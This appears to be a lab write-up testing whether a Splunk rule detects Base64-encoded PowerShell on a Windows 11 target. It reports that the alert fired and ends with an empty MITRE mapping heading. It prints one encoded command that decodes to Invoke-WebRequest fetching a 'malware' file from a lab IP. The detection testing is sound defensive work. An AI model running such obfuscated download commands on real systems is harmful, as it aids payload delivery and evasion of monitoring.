## Purpose

To simulate a real-world attacker technique where an adversary uses Base64-encoded PowerShell commands to download a second-stage payload (malware) from a remote server, while evading basic command-line detection. The objective is to test whether the Splunk detection rule can successfully identify and alert on the encoded PowerShell execution, regardless of whether the download succeeds.


## Commands Used 

```
powershell -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMwAxAC4AMQA4ADUALwBtAGEAbAB3AGEAcgBlAC4AdAB4AHQAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAQwA6AFwAUAByAG8AZwByAGEAbQBEAGEAdABhAAoAbwB0AC0AYQAtAG0AYQBsAHcAYQByAGUALgB0AHgAdAAiAAoA

```

## Target 

OS : Windows 11

Target IP : 192.168.31.113

Attack Vector : PowerShell execution over SSH


## Expected Detection

The Splunk Detection rule is designed to capture PowerShell Encoded Commands where the files is Downloaded into the System such as Malware to and Sysmon ID 1 (process creation) where the Command Line contains -EncdoedCommand and Encoded.


## Actual Detection

The Splunk Alert Triggered Successfully because the command line contains the PowerShell with EncodedCommand. 


## Screenshots 

#### Alert 

![alert](/screenshots/Powershell-encoded-command/Triggered-Alert.png)

#### Dashboard

![dashboard](/screenshots/Powershell-encoded-command/Dashboard-Triggered-Alert.png)



MITRE Mapping :

